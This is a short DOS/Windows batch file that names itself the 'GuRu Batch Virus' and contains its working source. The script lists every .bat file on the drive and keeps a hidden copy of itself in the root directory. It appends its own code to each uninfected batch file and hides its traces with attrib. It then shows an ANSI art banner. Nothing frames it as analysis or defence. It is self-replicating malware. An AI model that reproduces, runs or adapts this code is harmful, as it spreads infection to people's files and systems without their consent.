@echo off
echo Guru
pause

@echo off% GuRu Batch Virus %
if ~%1==~&! goto GuRu%2
if exist guru&?.* goto GuRuX
set GuRu=%0.bat
if ~%0==~ set GuRu=autoexec.bat
if not exist %guru% set GuRu=%0
if exist \&guru.bat goto GuRu1
if not exist %guru% goto GuRuQ
find "GuRu"<%guru%>\&guru.bat
attrib \&GuRu.bat +h
:GuRu1
if exist enter.bat \&GuRu.bat &! A
if exist \&guru goto GuRu2
dir *.bat /s/b>\&GuRu
if exist ..\nul dir ..\*.bat /s/b>>\&GuRu
echo.>>\&GuRu
:GuRu2
echo>enter.bat \&GuRu.bat &! 3 %%4
type \&GuRu|date|find "En">guru&.bat
GuRu&.bat
:GuRuA
if not exist %guru% goto GuRuQ
find /v "GuRu"<%guru%>GuRu&
copy GuRu& %guru%>nul
set GuRu=echo
%GuRu% [0;37;40m[2J[1;35;44m[4;10H                      
%GuRu% [4;32H        [5;10H  ������         �����        
%GuRu% [6;10H  �    �         �   �        [7;10H  �      
%GuRu% [7;19H  �  �  �����  �  �  [8;10H  �   ���  �  �  �
%GuRu% [8;28H  �   �  �  [9;10H  �     �  �  �  �   �  �  
%GuRu% [9;37H�  [10;10H  �������  ����  �   �  ����  
%GuRu% [11;10H                              [2B[0m
goto GuRuQ
:GuRu3
del enter% GuRu%.bat
attrib \&GuRu -h
if ~%3==~ del \&GuRu
if ~%3==~ goto GuRuA
type \&GuRu|find /v "%3">GuRu&
copy GuRu& \&guru>nul
attrib \&GuRu +h
if not exist %3 goto GuRu2
find "GuRu"<%3>GuRu&
copy GuRu& guru&i>nul
if exist guru&i goto GuRu2
type %3>GuRu&
echo.>>GuRu&
type \&guru.bat>>GuRu&
copy GuRu& %3>nul
:GuRuQ
if exist GuRu&?.* del guru&?.*
:GuRuX
